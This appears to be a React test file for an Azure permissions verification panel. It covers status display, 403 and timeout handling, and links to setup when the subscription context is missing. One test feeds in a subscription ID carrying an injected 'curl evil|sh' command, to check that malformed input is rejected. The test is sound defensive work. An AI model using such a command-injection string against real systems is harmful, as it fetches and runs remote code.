import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

const useNavCallerAuthorityRank = vi.hoisted(() => vi.fn(() => 100));
const validateTier2ConnectionHostedRun = vi.hoisted(() => vi.fn());

vi.mock("@/components/operator/OperatorNavAuthorityProvider", () => ({
  useNavCallerAuthorityRank: () => useNavCallerAuthorityRank(),
}));

vi.mock("@/lib/api/cloud-connections-api", () => ({
  validateTier2ConnectionHostedRun: (...args: unknown[]) => validateTier2ConnectionHostedRun(...args),
}));

import { HelpAzurePermissionsVerificationPanel } from "@/app/(operator)/help/_sections/HelpAzurePermissionsVerificationPanel";
import { ApiRequestError } from "@/lib/api-request-error";
import { AZURE_CLOUD_CONNECTION_VERIFICATION_BEHAVIOR } from "@/lib/azure-cloud-connection-permissions-manifest";

function apiError(httpStatus: number, detail: string): ApiRequestError {
  return new ApiRequestError(detail, {
    problem: { detail, title: "Error", status: httpStatus, type: "about:blank" },
    correlationId: null,
    httpStatus,
  });
}

describe("HelpAzurePermissionsVerificationPanel", () => {
  it("shows does-not-verify items in idle state", () => {
    render(
      <HelpAzurePermissionsVerificationPanel returnHref="/integrations/cloud-connections/azure" />,
    );

    expect(screen.getByTestId("azure-permissions-does-not-verify")).toBeInTheDocument();

    for (const item of AZURE_CLOUD_CONNECTION_VERIFICATION_BEHAVIOR.doesNotVerify) {
      expect(screen.getByText(item)).toBeInTheDocument();
    }

    expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent("Not checked");
  });

  it("links to Azure connection setup when subscription context is missing", () => {
    render(
      <HelpAzurePermissionsVerificationPanel returnHref="/integrations/cloud-connections/azure" />,
    );

    expect(screen.queryByText(/Add.*subscriptionId/i)).not.toBeInTheDocument();
    expect(screen.getByRole("link", { name: "Open Azure connection setup to verify" })).toHaveAttribute(
      "href",
      "/integrations/cloud-connections/azure",
    );
    expect(screen.queryByTestId("azure-permissions-verify-button")).not.toBeInTheDocument();
  });

  it("treats malformed subscription IDs as missing context", () => {
    render(
      <HelpAzurePermissionsVerificationPanel
        subscriptionId={'x"; curl evil|sh; A="'}
        returnHref="/integrations/cloud-connections/azure"
      />,
    );

    expect(screen.queryByTestId("azure-permissions-verify-button")).not.toBeInTheDocument();
    expect(screen.getByRole("link", { name: "Open Azure connection setup to verify" })).toBeInTheDocument();
  });

  it("renders a StatusTag for each verification state", async () => {
    useNavCallerAuthorityRank.mockReturnValue(100);
    validateTier2ConnectionHostedRun.mockResolvedValueOnce({ resourceCount: 12 });

    const { rerender } = render(
      <HelpAzurePermissionsVerificationPanel
        subscriptionId="00000000-0000-0000-0000-000000000001"
        returnHref="/integrations/cloud-connections/azure"
      />,
    );

    expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent("Not checked");

    fireEvent.click(screen.getByTestId("azure-permissions-verify-button"));
    expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent("Checking permissions");

    await waitFor(() => {
      expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent("Required access confirmed");
    });

    expect(screen.getByTestId("azure-permissions-verify-success")).toHaveTextContent(
      "Cost Management Reader assignment was not validated",
    );

    validateTier2ConnectionHostedRun.mockRejectedValueOnce(
      apiError(403, "Response status code does not indicate success: 403 (Forbidden)."),
    );
    rerender(
      <HelpAzurePermissionsVerificationPanel
        subscriptionId="00000000-0000-0000-0000-000000000002"
        returnHref="/integrations/cloud-connections/azure"
      />,
    );
    fireEvent.click(screen.getByTestId("azure-permissions-verify-button"));

    await waitFor(() => {
      expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent("Required permission missing");
    });

    validateTier2ConnectionHostedRun.mockRejectedValueOnce(new Error("upstream timeout"));
    rerender(
      <HelpAzurePermissionsVerificationPanel
        subscriptionId="00000000-0000-0000-0000-000000000003"
        returnHref="/integrations/cloud-connections/azure"
      />,
    );
    fireEvent.click(screen.getByTestId("azure-permissions-verify-button"));

    await waitFor(() => {
      expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent(
        "Verification could not be completed",
      );
    });
  });

  it("uses primary styling for verify when subscription context is present", () => {
    render(
      <HelpAzurePermissionsVerificationPanel
        subscriptionId="00000000-0000-0000-0000-000000000001"
        returnHref="/integrations/cloud-connections/azure"
      />,
    );

    expect(screen.getByTestId("azure-permissions-verify-button").className).toMatch(
      /--al-primary-action-bg/,
    );
  });

  it("maps non-permission failures to verification could not be completed", async () => {
    useNavCallerAuthorityRank.mockReturnValue(100);

    const cases: Array<{ readonly rejection: unknown }> = [
      { rejection: "upstream timeout" },
      { rejection: new Error("") },
      { rejection: new Error("System.InvalidOperationException: stack trace payload") },
      { rejection: new Error("could not read the subscription") },
    ];

    for (const testCase of cases) {
      validateTier2ConnectionHostedRun.mockRejectedValueOnce(testCase.rejection);

      const view = render(
        <HelpAzurePermissionsVerificationPanel
          subscriptionId="00000000-0000-0000-0000-000000000004"
          returnHref="/integrations/cloud-connections/azure"
        />,
      );

      fireEvent.click(screen.getByTestId("azure-permissions-verify-button"));

      await waitFor(() => {
        expect(screen.getByTestId("azure-permissions-verify-status")).toHaveTextContent(
          "Verification could not be completed",
        );
      });

      view.unmount();
    }
  });
});
